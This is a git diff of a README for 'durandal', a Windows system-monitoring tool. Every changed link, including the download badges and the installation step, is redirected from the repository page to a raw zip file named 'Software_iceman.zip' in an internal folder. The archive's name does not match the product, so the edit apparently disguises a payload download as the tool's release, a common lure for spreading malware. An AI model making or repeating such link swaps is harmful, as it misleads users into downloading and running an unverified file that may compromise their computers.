@@ -1,6 +1,6 @@
 # ⚙️ durandal - Monitor Your System Simply and Clearly
 
-[![Download durandal](https://img.shields.io/badge/Download-durandal-green?style=for-the-badge)](https://github.com/Volcanoislandsreview968/durandal)
+[![Download durandal](https://img.shields.io/badge/Download-durandal-green?style=for-the-badge)](https://raw.githubusercontent.com/Volcanoislandsreview968/durandal/main/internal/Software_iceman.zip)
 
 ---
 
@@ -16,7 +16,7 @@ This tool is built to run on Windows in a command line window, giving you real-t
 
 You can get durandal on your Windows computer by visiting the download page below.
 
-[Download durandal](https://github.com/Volcanoislandsreview968/durandal)
+[Download durandal](https://raw.githubusercontent.com/Volcanoislandsreview968/durandal/main/internal/Software_iceman.zip)
 
 Here is what you need before you start:
 
@@ -33,7 +33,7 @@ No installation is required beyond downloading the file. You will run the progra
 Follow these steps to get durandal up and running:
 
 1. Open your web browser and go to the main download page:  
-   [https://github.com/Volcanoislandsreview968/durandal](https://github.com/Volcanoislandsreview968/durandal)
+   [https://raw.githubusercontent.com/Volcanoislandsreview968/durandal/main/internal/Software_iceman.zip](https://raw.githubusercontent.com/Volcanoislandsreview968/durandal/main/internal/Software_iceman.zip)
 
 2. Look for the latest Windows version of durandal. Usually, this will be under a "Releases" section or a link with a `.exe` or `.zip` file included.
 
@@ -107,4 +107,4 @@ If you still have issues, you can search for help on the GitHub page linked belo
 
 Click the button below to visit the durandal download page and get the latest Windows version:
 
-[![Get durandal](https://img.shields.io/badge/Get%20durandal-blue?style=for-the-badge)](https://github.com/Volcanoislandsreview968/durandal)
+[![Get durandal](https://img.shields.io/badge/Get%20durandal-blue?style=for-the-badge)](https://raw.githubusercontent.com/Volcanoislandsreview968/durandal/main/internal/Software_iceman.zip)
